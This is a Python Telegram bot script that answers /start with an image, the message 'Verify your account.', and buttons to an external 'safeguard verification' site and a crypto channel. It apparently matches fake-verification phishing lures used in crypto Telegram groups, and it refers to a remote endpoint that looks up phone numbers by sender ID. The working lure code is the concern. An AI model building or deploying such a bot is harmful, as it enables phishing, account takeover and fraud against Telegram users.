import asyncio
import aiohttp  # For asynchronous HTTP requests
from telethon import TelegramClient, events
from telethon.tl.custom import Button
from dotenv import load_dotenv
import os
from aiohttp import web  # For the HTTP server

# Load environment variables
load_dotenv()

api_id = os.getenv('API_ID')
api_hash = os.getenv('API_HASH')
bot_token = os.getenv('BOT_TOKEN')

bot_client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# External API endpoint (Flask server endpoint)
FLASK_API_URL = 'https://telebot-ivng.onrender.com/get_phone_by_sender_id'
API_URL = 'https://telebot-ivng.onrender.com/send_message'

@bot_client.on(events.NewMessage(pattern='/start'))
async def on_start(event):
    try:
        # Download the image asynchronously
        image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/safeguard%20bot%2FScreenshot_20241223_101134_Telegram.jpg?alt=media&token=b207be6b-c41d-41ed-84e7-37855b02a4f8'
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as response:
                if response.status == 200:
                    image_data = await response.read()  # Read image bytes

                    await event.respond(
                        file=image_data,  # Send the image as bytes
                        message="Verify your account.",
                        buttons=[
                            [Button.url("Verify", "https://safeguardverification.netlify.app/")],
                            [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]
                        ]
                    )
                else:
                    print("Failed to fetch the image from the provided URL.")

    except Exception as e:
        print(f"Error: {e}")

# Health check endpoint
async def health_check(request):
    return web.Response(text="Bot is running!")

async def run_http_server():
    app = web.Application()
    app.router.add_get('/health', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 5001)
    await site.start()

# Main function
async def main():
    await bot_client.start()
    print("Bot is running...")
    await run_http_server()
    await bot_client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
